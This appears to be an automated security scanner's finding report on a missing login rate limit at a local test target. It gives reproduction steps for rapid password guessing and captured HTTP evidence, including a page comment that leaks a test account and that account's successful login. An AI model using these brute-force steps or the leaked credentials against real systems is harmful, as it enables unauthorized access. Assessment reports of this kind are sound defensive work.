**Reproduction**

```
1. Send POST /login (no session) with body username=test&password=bruteN for N=1..12 in rapid succession (plus ~8 earlier failed attempts). 2. Every response is 200 with body "Invalid username or password" (e.g. ev-mr31llon-1d, ev-mr31lmng-1e, ev-mr31lnv7-1f) — no 429, no Retry-After header, no lockout message, no CAPTCHA, no added latency. 3. A valid credential still authenticates immediately afterward (ev-mr31ibsf-7, 302), proving requests are being fully evaluated with no throttle in place.
```

**Evidence**

- Evidence `ev-mr31ibsf-7` — `artifacts/s-0001/ev-mr31ibsf-7/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

username=test&password=test
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 197
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:04:26 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /home
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/home">/home</a>. If not, click the link.
```

- Evidence `ev-mr31lmng-1e` — `artifacts/s-0001/ev-mr31lmng-1e/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=brute11
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1900
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:07:00 GMT
expires: 0
keep-alive: timeout=5, max=90
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                        <!-- Display error message if login fails -->
                        <div class="alert alert-danger mt-3" role="alert">
                            Invalid username or password
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr31lnv7-1f` — `artifacts/s-0001/ev-mr31lnv7-1f/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=brute12
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1900
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:07:01 GMT
expires: 0
keep-alive: timeout=5, max=89
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                        <!-- Display error message if login fails -->
                        <div class="alert alert-danger mt-3" role="alert">
                            Invalid username or password
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr31llon-1d` — `artifacts/s-0001/ev-mr31llon-1d/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=brute10
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1900
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:06:58 GMT
expires: 0
keep-alive: timeout=5, max=91
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                        <!-- Display error message if login fails -->
                        <div class="alert alert-danger mt-3" role="alert">
                            Invalid username or password
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```
